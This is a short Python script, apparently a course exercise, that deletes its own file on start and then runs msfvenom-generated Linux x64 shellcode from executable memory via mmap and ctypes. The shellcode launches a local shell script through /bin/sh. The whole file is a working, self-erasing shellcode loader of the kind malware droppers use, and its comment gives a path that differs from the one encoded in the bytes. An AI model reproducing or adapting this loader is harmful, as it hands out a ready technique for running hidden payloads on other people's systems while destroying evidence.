import ctypes
import mmap
import os
import sys


current_script = os.path.abspath(sys.argv[0])

#msfvenom -p linux/x64/exec CMD="/home/nghia/Desktop/VCS/4/./SysProg_5.sh" -f python
buf =  b""
buf += b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50"
buf += b"\x54\x5f\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x29"
buf += b"\x00\x00\x00\x2f\x68\x6f\x6d\x65\x2f\x6e\x67\x68"
buf += b"\x69\x61\x2f\x44\x65\x73\x6b\x74\x6f\x70\x2f\x56"
buf += b"\x43\x53\x2f\x35\x2f\x2e\x2f\x53\x79\x73\x50\x72"
buf += b"\x6f\x67\x5f\x35\x2e\x73\x68\x00\x56\x57\x54\x5e"
buf += b"\x6a\x3b\x58\x0f\x05"


def DelMe():
    os.remove(current_script)

def main():
    DelMe()

    shellcode_mem = mmap.mmap(-1, len(buf), flags=mmap.MAP_SHARED | mmap.MAP_ANONYMOUS, prot=mmap.PROT_WRITE | mmap.PROT_EXEC)
    shellcode_mem.write(buf)
    func = ctypes.CFUNCTYPE(ctypes.c_void_p)(ctypes.addressof(ctypes.c_int.from_buffer(shellcode_mem)))
    func()
    
if __name__ == "__main__":
    main()
    
